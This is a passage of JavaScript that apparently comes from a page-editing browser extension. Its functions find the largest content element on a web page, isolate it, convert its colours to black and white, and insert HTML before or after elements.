      doc.body.style.backgroundImage = "none";
      if (doc.body.style.color == "white") {
doc.body.style.color = "black";
      };
      if (doc.body.text == "white") {
doc.body.text = "black";
      };
    };
};
function insertAfter(newNode, target) {
    var parent = target.parentNode;
    var refChild = target.nextSibling;
    if(refChild != null)
parent.insertBefore(newNode, refChild);
    else
parent.appendChild(newNode);
};
function html_insert_it(doc, element, new_html, before, insert_as_block) {
  var new_element;
  if (insert_as_block) {
    new_element = doc.createElement ("DIV");
  } else {
    new_element = doc.createElement ("SPAN");
  };
  new_element.innerHTML = new_html;
  if (before) {
      element.parentNode.insertBefore(new_element, element);
  } else {
      insertAfter(new_element, element);
  };
};
function auto_repair_it(doc, node) {
  Dump("In auto_repair_it...");
  var biggest_elem = find_biggest_elem(doc);
  Dump("biggest_elem = "+biggest_elem);
  isolate(doc, biggest_elem);
  Dump("After isolate.");
  relax(doc, biggest_elem);
  Dump("After relax.");
  make_bw(doc, biggest_elem);
  Dump("After make_bw.");
  fix_page_it(doc, biggest_elem);
  Dump("After fix_page_it.");
};
function find_biggest_elem(doc) {
  const big_element_limit = 0.25;
  var size_of_doc = doc.documentElement.offsetHeight *
      doc.documentElement.offsetWidth;
  var body = doc.body;
  var size_of_body = body.offsetHeight * body.offsetWidth;
  if (size_of_body < (0.80 * size_of_doc)) {
      size_of_body = size_of_doc;
  };
  var max_size = 0;
  var max_elem = doc;
  /*  
  var allElems = doc("//*",
     doc, null,
     XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
     null);
  Dump("allElems = "+allElems);
  Dump("allElems.snapshotLength = "+allElems.snapshotLength);
  for (var i = 0; i < allElems.snapshotLength; i++) {
    var thisElem = allElems.snapshotItem(i);
  */
    
  var allElems = doc.getElementsByTagName("*");
  Dump("allElems = "+allElems);
  Dump("allElems.snapshotLength = "+allElems.length);
  for (var i = 0; i < allElems.length; i++) {
      var thisElem = allElems[i];
      var thisElem_size = thisElem.offsetHeight * thisElem.offsetWidth;

      if (thisElem_size < size_of_body &&
  thisElem_size > max_size &&
  !contains_big_element(thisElem, size_of_body * big_element_limit)) {
  max_size = thisElem_size;
  max_elem = thisElem;
      };
  };
  Dump("Max elem = "+max_elem.tagName);
  return max_elem;
};

function contains_big_element(node, limit) {
    if (node.childNodes.length != 0)
for (var i=0; i<node.childNodes.length; i++) {
    var child = node.childNodes.item(i);
    var child_size = child.offsetHeight * child.offsetWidth;
    if (child_size > limit) return true;
};
    return false;
};

function platypus_do(win, func_name, o, other, other2, other3) {
    var func = eval(func_name);
    var doc = null;
    if (func == null) return;
    if (!o) {
Warning(platypusplatypuscouldntfi1+
func_name+platypusthisusuallyhappens);
    };
    doc = win.document;
    func(doc, o, other, other2, other3);
};

